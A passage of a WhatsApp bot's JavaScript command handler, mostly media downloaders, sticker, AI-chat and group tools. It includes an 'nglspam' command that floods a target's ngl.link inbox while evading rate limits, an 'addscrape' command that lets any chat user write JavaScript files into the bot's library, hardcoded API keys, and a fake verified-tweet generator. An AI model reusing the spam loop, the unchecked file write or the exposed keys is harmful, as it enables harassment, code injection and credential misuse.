mimetype: "application/zip",
fileName: "backup.zip",
},
{quoted: m });
await execSync("rm -rf Backup.zip");
}
break
case "removebg": case "nobg": {
try {
    const media = await cay.downloadAndSaveMediaMessage(qmsg);
    let urlnj = await uploadUguu(media);
    let buuhv = await fetchJson(`https://widipe.com/removebg?url=${urlnj}`);
    const vbbjjhbbuub = buuhv.result.urls;
    await cay.sendMessage(m.chat, {
        image: { url: vbbjjhbbuub },
        caption: "Done",
    }, { quoted: m });

} catch (err) {
    console.error("Error during background removal:", err);
}
}
break
case 'tt2': {
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`

    if (!text) return m.reply(input)
    
  if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
async function tiktokDl2(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (res && !res.size && !res.wm_size && !res.hd_size) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				if (res && res.wmplay) {
					data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay })
				}
				if (res && res.play) {
					data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play })
				}
				if (res && res.hdplay) {
					data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay })
				}
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			reject(e)
		}
	});
}
let down = await tiktokDl2(text)
let berak = `[ *TIKTOK DOWNLOADER* ]

Videos:
Judul: ${down.title}
Server: ${down.region}
ID: ${down.id}
Durasi: ${down.duration}
Size: ${down.size_nowm_hd}

Music Info:
ID: ${down.music_info.id}
Judul: ${down.music_info.title}
Pemilik Musik: ${down.music_info.author}

Stats: 
Views: ${down.stats.views}
Likes: ${down.stats.likes}
Comment: ${down.stats.comment}
Share: ${down.stats.share}
Download: ${down.stats.download}

Author: 
ID: ${down.author.id}
Full Name: ${down.author.fullname}
Nickname: ${down.author.nickname}
Avatar: ${down.author.avatar}
`
await cay.sendMessage(m.chat, { video: { url: down.data[2].url }, caption: berak }, { quoted: m })
await cay.sendMessage(m.chat, { audio: { url: down.music_info.url }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
break
case 'onlypc': case 'pconly':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator&&!isPremium) return reply(msg.owner)
if (args[0] == 'on'){
if (global.onlypc) return reply('udah on!')
global.onlypc = true
reply('sukses /private chat')
} else if (args[0] == 'off'){
if (!global.onlypc) return reply('sudah dimatikan sebelumnya!')
global.onlypc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By cay
case 'onlygc': case 'gconly':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator&&!isPremium) return reply(msg.owner)
if (args[0] == 'on'){
if (global.onlygc) return reply('udah on!')
global.onlygc = true
reply('sukses only group chat')
} else if (args[0] == 'off'){
if (!global.onlygc) return reply('sudah dimatikan sebelumnya!')
global.onlygc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By cay
case 'tiktok':
case 'tt3': {
if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
let res = await tiktok2(`${args[0]}`)
				cay.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				cay.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break

case 'spotify': case 'spotifysearch': {
if (!text) return m.reply('❌ *Spotify Search* ❌\n\nSilakan masukkan kata kunci untuk mencari lagu di Spotify.')
  try {
 do2 = await searchSpotifyTracks(text)
let ini_text = '✨ *Spotify Search* ✨';
for (const x of do2) {
ini_text += `\n
      •🎵 *Judul:* ${x.name}
👥 *Artis:* ${x.artists.map(v => v.name).join(', ')}
👥 *Artis Album:* ${x.album.artists.map(v => v.name).join(', ')}
🆔 *ID:* ${x.id}
📅 *Tanggal Rilis Album:* ${x.album.release_date}
🆔 *ID Album:* ${x.album.id}
🎵 *Jumlah Trek Album:* ${x.album.total_tracks}
🔢 *Nomor Trek:* ${x.album.track_number}
⏳ *Durasi:* ${x.duration_ms} ms
🔗 *Uri:* ${x.uri}
🎵 *URL Album*: ${x.album.external_urls.spotify}\n
───────────────────
`;
}
reply(ini_text)
} catch (e) {
    return m.reply('❌ *Spotify Search* ❌\n\nTerjadi Kesalahan, Coba Lagi Nanti.')
  }
  }
break

 			case 'ytmp3': {
				if (!text) return reply(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!text.match('youtu')) return reply('Link Kamu Salah!')
				await cay.sendMessage(m.chat, {
					react: {
						text: "❄️",
						key: m.key,
					}
				})
				YouTubeMp3(args[0], args[1])
			}
			break
case 'ytmp4': {
				if (!text) return reply(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!text.match('youtu')) return reply('Link Tidak Terdeteksi\n🖕🏽!')
				await cay.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				YouTubeMp4(args[0], args[1])
			}
			break
			case 'smeta': {
dellimit(1)
function makeid(length) {
let result = "";
const characters =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const charactersLength = characters.length;

for (let i = 0; i < length; i++) {
result += characters.charAt(
Math.floor(Math.random() * charactersLength),
);
}
return result;
}
async function addExifAvatar(
 buffer,
 packname,
 author,
 categories = [""],
 extra = {},
) {
 const {
default: { Image },
 } = await import("node-webpmux");
 const img = new Image();
 const json = {
"sticker-pack-id": "Natsxe",
"sticker-pack-name": packname,
"sticker-pack-publisher": author,
emojis: categories,
"is-avatar-sticker": 1,
...extra,
 };
 let exifAttr = Buffer.from([
0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
 ]);
 let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8");
 let exif = Buffer.concat([exifAttr, jsonBuffer]);
 exif.writeUIntLE(jsonBuffer.length, 14, 4);
 await img.load(buffer);
 img.exif = exif;
 return await img.save(null);
 }
 

 var stiker = false
 try {
 let [packname, ...author] = q.split('|')
 //var author = (author []).join('|')
 let mime = m.quoted.mimetype || ''
 if (!/webp/.test(mime)) throw reply('Reply sticker!')
 //let img = await q.download()
 let img = await cay.downloadAndSaveMediaMessage(quoted, makeid(5))
 if (!img) throw 'Reply a sticker!'
 var stiker = await addExifAvatar(img, `Tdgf`, `${pushname}`)
 } catch (e) {
 console.error(e)
 if (Buffer.isBuffer(e)) stiker = e
 } finally {
 if (stiker) cay.sendMessage(m.chat, {
 sticker: stiker
 }, {
 quoted: m
 })
 else throw 'reply sticker'
 }
 }
 
 break

case "addscrape":
if (!text) return reply(` *Example :* ${prefix + command} y2mateid`)
 try {
 if (!m.quoted.text) return reply(`🚩 Reply Code Message!`)
 let path = `./lib/${text}.js`
 await fs.writeFileSync(path, m.quoted.text)
 reply(`🚩 Saved in ${path}`)
 } catch (error) {
 console.log(error)
 reply("🚩 Reply Code Message!")
 }
break
case 'emojimix': {
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return reply(`Contoh : ${prefix + command} 😅+🤔`)
if (!emoji2) return reply(`Contoh : ${prefix + command} 😅+🤔`)
reply(msg.wait)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await cay.sendImageAsSticker(m.chat, res.url, m, {
packname: global.packname,
author: 'Hutao bot',
categories: res.tags
})
await fs.unlinkSync(encmedia)
}
                
}
break
case 'ytplay2':
case 'play2':{
if (!q) return reply(`🚩 *Example:* ${prefix+command} lagu sad`)
let yts = require('yt-search')
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let a = `💸Duration : ${anu.timestamp}\n🎉Viewers : ${anu.views}\n`
await cay.sendMessage(m.chat, {
text: a,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: anu.title,
body: anu.ago,
thumbnailUrl: anu.image,
sourceUrl: anu.url,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
await sleep(1000)
if (anu.seconds < 1000) {
await ytmp3(anu.url)
} else reply('durasi nya bro ke besaran')
}
break
case 'gdrive': { 
if (!text) return reply(`Example ${prefix + command} url`)
async function GDriveDl(url) {
	let id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))?.[1]
	if (!id) return reply('ID Not Found')
	let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
		method: 'post',
		headers: {
			'accept-encoding': 'gzip, deflate, br',
			'content-length': 0,
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'origin': 'https://drive.google.com',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
			'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
			'x-drive-first-party': 'DriveWebUi',
			'x-json-requested': 'true' 
		}
	})
	let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
	if (!downloadUrl) return reply('Link Download Limit!')
	let data = await fetch(downloadUrl)
	if (data.status !== 200) throw data.statusText
	return {
		downloadUrl, fileName,
		fileSize: (sizeBytes / 1024 / 1024).toFixed(2),
		mimetype: data.headers.get('content-type')
	}
}
try {
  let kanjuttgede = await GDriveDl(text)
  let bjirrbang = `*Google Drive*\n\nNama: ${kanjuttgede.fileName}\nLink: ${kanjuttgede.downloadUrl}`
  reply(bjirrbang)
  await cay.sendMessage(m.chat, { document: { url: kanjuttgede.downloadUrl }, fileName: kanjuttgede.fileName, mimetype: kanjuttgede.mimetype }, { quoted: m })
} catch (error) {
  m.reply(`${error.message}`)
}
}
break
case `ig`: case 'igvid': case 'igmp4': case 'igdl':{
    if (!text) return m.reply(`Anda perlu memberikan URL video, reel`);
   // reply (msg.wait)
    let res;
    try {
        res = await fetch(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
    } catch (error) {
        return m.reply(`An error occurred: ${error.message}`);
    }

    let api_response;
    try {
        api_response = await res.json();
    } catch (error) {
        return m.reply(`Failed to parse API response: ${error.message}`);
    }

    if (!api_response || !api_response.result || api_response.result.length === 0) {
        return m.reply(`No video or image found or Invalid response from API.`);
    }

try {
    const mediaData = api_response.result[0]; // Ambil elemen pertama dari array result
    //const mediaType = mediaData.thumbnail ? 'image' : 'video'; // Periksa apakah thumbnail ada
    const mediaURL = mediaData.url;
    const cap = `HERE IS THE VIDEO`;

            await cay.sendMessage(m.chat, { video: { url: mediaURL }, caption: cap }, { quoted: m });
        
    } catch (error) {
        return m.reply(`Failed to send media: ${error}`);
    }
}
break

case 'vtuber': {
if (!text) return reply(`Example ${prefix+command} kobo kanaeru`)
const { wiki } = require("vtuber-wiki");
async function getVTuber(vtuber) {
    try {
        const result = await wiki(vtuber);
        if (!result.image_url) return { error: "No such vTuber" };
        return result;
    } catch (err) {
        return { error: "No such vTuber" };
    }
}
try {
let tuber = await getVTuber(text)
let pituber = `[ *VTUBER WIKI* ]

Judul: ${tuber.title}
Link: ${tuber.url}
Author: ${tuber.author}
Account: ${tuber.account}
Date: ${tuber.date}
Type: ${tuber.type}
Channel: ${tuber.channel}
Social Media: ${tuber.social_media}
Offcial Website: ${tuber.official_website}
Gender: ${tuber.gender}
Age: ${tuber.age}
Description: ${tuber.description}
More: ${tuber.more}
`

cay.sendMessage(m.chat, {image: {url: tuber.image_url}, caption: pituber}, {quoted: m})
} catch (e) {
  m.reply(e)
}
}
break



case 'turbo': {
if (!q) return m.reply(`where the question`)
const fetch = require('node-fetch');
// wm avz
async function avvmx(av) {
    try {
        const avis = await fetch("https://www.turboseek.io/api/getAnswer", {
            method: "POST",
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; Infinix HOT 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
                Referer: "https://www.turboseek.io/",
                "av-Type": "application/json"
            },
            body: JSON.stringify({
                question: av,
                sources: []
            })
        });
// wm avz
        const data = await avis.text();
        const avv = data.split("\n").map(line => {
            try {
                return JSON.parse(line.slice(6)).text;
            } catch (e) {
                return "";
            }
        });
// wm avz
        const avosky = avv.join("").trim();
        const avoskyy = `${avosky}`;
// wm avz
        return avoskyy.trim();
    } catch (error) {
        console.error("Error:", error);
        return null;
    }
}
// wm avz
async function avoskyyy(m, question) {
    const answer = await avvmx(question);
    if (answer) {
        m.reply(answer);
    } else {
        m.reply("Terjadi kesalahan.");
    }
}
// wm avz
const avosks = `${q}`  
avoskyyy(m, avosks);
}
break

case 'faketweet':{
const canvafy = require('canvafy')
if (!text) return reply(`Exmaple : Name1 | Name2 | Text`)
 nama1 = text.split("|")[0]
 nama2 = text.split("|")[1]
 katakata = text.split("|")[2]
const tweet = await new canvafy.Tweet()
  .setTheme("dim")
  .setUser({displayName: nama1, username: nama2})
  .setVerified(true)
  .setComment(katakata)
  .setAvatar(ppuser)
  .build();
 let tanaka = tweet
  cay.sendMessage(m.chat, { image: tanaka, caption: 'Done' },{ quoted : m })     
}
break
case 'msgx': {
    // Pastikan hanya owner yang dapat menggunakan perintah ini
    if (!isOwner) return reply("Khusus Owner!");

    // Pastikan perintah dijalankan dengan reply
    if (!m.quoted) return reply("Silakan reply pesan yg mau di ambil jsonnya");

    // Ambil JSON dari pesan yang di-reply
    const quotedJson = JSON.stringify(m.quoted, null, 2);

    // Kirimkan JSON ke owner sebagai teks
    reply(`Berikut adalah JSON dari pesan yang di-reply:\n\`\`\`${quotedJson}\`\`\``);

    break;
}
case 'nglspam': {
if (!isOwner) return reply(msg.owner)
    if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
        return m.reply("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam cay|haloo|5");
    }
async function sendSpamMessage(username, message, spamCount) {
    let counter = 0;
    while (counter < spamCount) {
        try {
            const date = new Date();
            const minutes = date.getMinutes();
            const hours = date.getHours();
            const formattedDate = `${hours}:${minutes}`;
            const deviceId = crypto.randomBytes(21).toString('hex');
            const url = 'https://ngl.link/api/submit';
            const headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Referer': `https://ngl.link/${username}`,
                'Origin': 'https://ngl.link'
            };
            const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

            const response = await fetch(url, {
                method: 'POST',
                headers,
                body,
                mode: 'cors',
                credentials: 'include'
            });

            if (response.status !== 200) {
                console.log(`[${formattedDate}] [Err] Ratelimited`);
                await new Promise(resolve => setTimeout(resolve, 25000));
            } else {
                counter++;
                console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
            }
        } catch (error) {
            console.error(`[${formattedDate}] [Err] ${error}`);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
};
    const [username, message, count] = text.split("|");
    const spamCount = parseInt(count, 10);

    if (isNaN(spamCount) || spamCount <= 0) {
        return m.reply("Jumlah spam harus berupa angka positif!");
    }

    try {
        await sendSpamMessage(username, message, spamCount);
        m.reply(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
    } catch (e) {
        console.error(e); // Menambahkan logging error untuk debug
        return m.reply("Fitur error, coba lagi nanti.");
    }
}
break
case 'suma':
case 'ai':
case 'toki': {
//wm hann
  if (!text) return m.reply(`hai om/tante, apa yang bisa saya bantu hari ini?`)
async function generateVoice(Query) {
    const formData = new FormData();
    formData.append("locale", 'id-ID');
    formData.append("content", `<voice name="ja-JP-AoiNeural">${Query}</voice>`);
    formData.append("ip", '46.161.194.33');
    const response = await fetch('https://app.micmonster.com/restapi/create', {
        method: 'POST',
        body: formData
    });
    return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
};
//wm hann
const sendToGemini = async (prompt) => {
    const apiKey = 'AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ'; // Dapatkan apikey dari  https://aistudio.google.com/app/apikey
    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${apiKey}`;
    //wm hann
    const body = {
        contents: [
            {
                parts: [
                    { text: prompt }
                ]
            }
        ]
    };
//wm hann
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(body)
        });

        const data = await response.json();

        if (response.ok) {
            return data; 
        } else {
            throw new Error(data.error.message || 'Request failed');
        }
    } catch (error) {
        console.error('Error:', error.message);
        return null;
    }
};
//wm hann
const prompt = `Nama kamu adalah hutao, kamu adalah assisten virtual yang dikembangkan langsung dari tuan caywzz`;
    const combinedPrompt = `${prompt} ${text}`;
//wm hann
    try {
        // Mengirim prompt ke API Gemini
        const response = await sendToGemini(combinedPrompt);
//wm hann
        if (response) {
//wm hann
            const candidates = response.candidates;
            let message = candidates && candidates.length > 0
                ? candidates[0].content.parts[0].text
                : 'Tidak ada respons yang diterima dari model.';
            //wm hann
            // Mengganti ** dengan * dan mengedit jawaban jika perlu
            messagee = message.replace(/\*\*/g, '*').replace(/#{2,}/g, '#');
        } else {
//wm hann
            cay.sendMessage(
                m.chat,
                { text: 'Gagal mendapatkan respons dari Gemini.' },
                { quoted: m }
            );
        }
    } catch (error) {
        console.error(error);
//wm hann
        cay.sendMessage(
            m.chat,
            { text: 'Terjadi kesalahan saat memproses permintaan Anda.' },
            { quoted: m }
        );
    }
//wm hann
    try {
//wm hann
        let res = await generateVoice(messagee)
await m.reply(messagee)
        if (res) await cay.sendMessage(m.chat, {
        audio: res,
        mimetype: 'audio/mp4',
        ptt: true,
        waveform: [100, 0, 100, 0, 100, 0, 100]
    }, {
        quoted: m
    })
    } catch (e) {
        await m.reply(e)
    }
//wm hann
}
break
case 'getcase':
if (!isOwner) return reply(`mau ngapain`)
const getCase = (cases) => {
return 'case'+`'${cases}'`+fs.readFileSync(`./hayongapain`).toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCase(q)}`)
break
case 'hutao': {
if (!text) return reply("Hai, ada yang mau kamu diskusikan hari ini")
async function v_girl(text,prompt, name) {
try {
const response = await axios.post('https://boredhumans.com/virtual_girlfriends/virtual_girlfriends_api.php',
      `prompt=${text.replace(/\s+/g, "%2520")}&chat_id=lwle4nyomx5t0w6quo8&init_prompt=${prompt.replace(/\s+/g, "%2520")}&voice_id=XrExE9yKIg1WjnnlVkGX&stability=0.5&similarity_boost=0.75&name=${name.replace(/\s+/g, "%2520")}&useAudio=false&dateLoc=Bookstore`,
      {
        headers: {
          'User-Agent': 'Googlebot-News',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
      });
    return response.data
    } catch (e) {
    return e
    }
    }

let prompt = 'Hutao is a beginner WhatsApp bot maker ', name = 'Hutao'
        let {
            output
        } = await v_girl(text, prompt, name);
        await m.reply(output[0]);
}
break

case "welcome": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!text) {
let teksnya = `Silahkan Pilih Tombol Options Settingan Grup Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Powered By ${namabot}`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "Welcome Options || Status : ${welcome.includes(m.chat) ? "Aktif ✅" : "Tidak Aktif ❌"}",
rows: [{ title: "ON Welcome", description: "Pilih Opsi Ini Untuk Mengaktifkan Welcome", id: ".welcome on" }, 
{ title: "OFF Welcome", description: "Pilih Opsi Ini Untuk Mematikan Welcome", id: ".welcome off" }]
}]}`*/
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
if (text == "on") {
if (welcome.includes(m.chat)) return reply("Welcome Di Grup Ini Sudah Aktif")
await welcome.push(m.chat)
await fs.writeFileSync("./all/database/welcome.json", JSON.stringify(welcome))
let teksnya = `*Welcome Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}" */
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
} else if (text == "off") {
if (!welcome.includes(m.chat)) return reply("Grup Ini Tidak Terdaftar Di Database Welcome")
let posi = welcome.indexOf(m.chat)
await welcome.splice(posi, 1)
await fs.writeFileSync("./all/database/welcome.json", JSON.stringify(welcome))
let teksnya = `*Welcome Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}" */
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
}
break
case 'wm':case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return reply(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
cay.downloadAndSaveMediaMessage(quoted, "gifee")
cay.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await cay.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await cay.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Photo/Video?`)
}
}
break
case 'toone': case 'toviewonce': { 
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await cay.downloadAndSaveMediaMessage(quoted)
cay.sendMessage(m.chat, {image: {url:anuan}, caption: `${global.namabot}~`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await cay.downloadAndSaveMediaMessage(quoted)
cay.sendMessage(m.chat, {video: {url:anuanuan}, caption: `${global.namabot}`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break

case "setgc": case "statusgc": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
let teksnya = `Silahkan Pilih Tombol Options Settingan Grup Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Powered By ${namabot}`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "Welcome Options || Status : ${welcome.includes(m.chat) ? "Aktif ✅" : "Tidak Aktif ❌"}",
rows: [{ title: "ON Welcome", description: "Pilih Opsi Ini Untuk Mengaktifkan Welcome", id: ".welcome on" }, 
{ title: "OFF Welcome", description: "Pilih Opsi Ini Untuk Mematikan Welcome", id: ".welcome off" }]
}]}`*/
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
     cay.sendImageAsSticker(m.chat, data.url, m, { packname: `${global.packname}`, author: `${global.author}`})
     
     })
break
case "kik": case "kick": {

if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isOwner && !isAdmin) return reply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await cay.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => cay.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
case "hidetag": case "z": case "h": {

if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
cay.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "open": {

if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isOwner) return reply(msg.owner)
